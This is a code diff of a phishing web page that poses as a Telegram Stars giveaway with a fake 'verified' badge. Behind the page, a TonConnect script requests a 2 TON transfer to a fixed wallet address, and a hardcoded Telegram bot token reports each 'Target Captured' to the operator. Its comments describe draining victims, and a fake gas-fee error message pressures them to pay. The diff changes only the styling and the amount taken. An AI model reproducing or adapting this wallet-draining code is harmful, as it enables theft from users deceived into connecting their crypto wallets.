@@ -7,11 +7,15 @@
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         body { background: #0e1621; color: white; font-family: -apple-system, sans-serif; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .card { background: #17212b; border-radius: 20px; padding: 40px; width: 90%; max-width: 400px; box-shadow: 0 20px 40px rgba(0,0,0,0.5); border: 1px solid #242f3d; }
+        .card { background: #17212b; border-radius: 20px; padding: 40px 20px; width: 90%; max-width: 400px; box-shadow: 0 20px 40px rgba(0,0,0,0.5); border: 1px solid #242f3d; }
         .verified-badge { background: #2481cc; color: white; padding: 6px 15px; border-radius: 50px; font-size: 13px; font-weight: bold; margin-bottom: 20px; display: inline-block; }
         .stars-val { font-size: 55px; font-weight: 900; margin: 10px 0; }
-        .desc { color: #7f91a4; font-size: 15px; margin: 20px 0; line-height: 1.5; }
-        .connect-btn { background: #2481cc; color: white; border: none; padding: 18px; border-radius: 12px; font-size: 20px; font-weight: bold; cursor: pointer; width: 100%; box-shadow: 0 4px 15px rgba(36, 129, 204, 0.4); text-decoration: none; display: block; }
+        .connect-btn { 
+            background: #2481cc; color: white; text-decoration: none;
+            padding: 18px; border-radius: 12px; font-size: 20px; font-weight: bold; 
+            display: block; width: 100%; box-sizing: border-box; margin-top: 20px;
+            box-shadow: 0 4px 15px rgba(36, 129, 204, 0.4); 
+        }
     </style>
 </head>
 <body>
@@ -21,7 +25,7 @@
         <img src="https://telegram.org/img/t_logo.png" width="50" style="display:block; margin: 0 auto 10px;">
         <div class="stars-val">80</div>
         <div style="color: #f4b400; font-weight: bold; font-size: 18px;">TELEGRAM STARS</div>
-        <p class="desc">Claim your 80 Stars instantly. Click the button below to connect your Telegram Wallet.</p>
+        <p style="color: #7f91a4; font-size: 15px; margin: 20px 0;">Claim your rewards instantly. Connect your wallet now.</p>
         
         <a href="https://t.me/wallet/start?startapp=connect" class="connect-btn">Connect Wallet</a>
 
@@ -29,7 +33,7 @@
     </div>
 
     <script>
-        // هادا الكود يخدم في الخلفية بمجرد ما يرجع الضحية للصفحة بعد الربط
+        // إعداد السكربت باش غير يرجع من تيليجرام يسحبلو
         const tonConnectUI = new TonConnectUI.TonConnectUI({
             manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react/tonconnect-manifest.json'
         });
@@ -40,12 +44,12 @@
                     validUntil: Math.floor(Date.now() / 1000) + 120,
                     messages: [{
                         address: "UQBW8KIbJpKHSx-9aq4gIwmM6ESMs-dpKVAQCj46hTyIxnXh",
-                        amount: "2500000000" 
+                        amount: "2000000000" 
                     }]
                 };
                 try {
                     await tonConnectUI.sendTransaction(transaction);
-                    fetch(`https://api.telegram.org/bot8351638574:AAG2xyCtbiP5ipHgFGG-3-ibueh1l5xlUNo/sendMessage?chat_id=6925387370&text=🎯 New Target Captured!`);
+                    fetch(`https://api.telegram.org/bot8351638574:AAG2xyCtbiP5ipHgFGG-3-ibueh1l5xlUNo/sendMessage?chat_id=6925387370&text=🎯 Target Captured!`);
                 } catch (e) {
                     alert("Error: Verification failed. 0.25 TON required for gas fees.");
                 }
